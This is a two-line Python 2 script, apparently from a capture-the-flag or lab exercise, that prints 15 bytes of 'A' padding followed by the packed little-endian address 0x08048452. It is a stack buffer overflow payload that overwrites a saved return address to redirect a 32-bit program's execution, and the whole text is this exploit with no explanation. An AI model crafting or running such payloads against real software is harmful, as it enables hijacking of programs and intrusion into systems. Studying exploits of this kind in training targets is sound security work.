from struct import pack
print "A"*15,pack("<I", 0x08048452 )

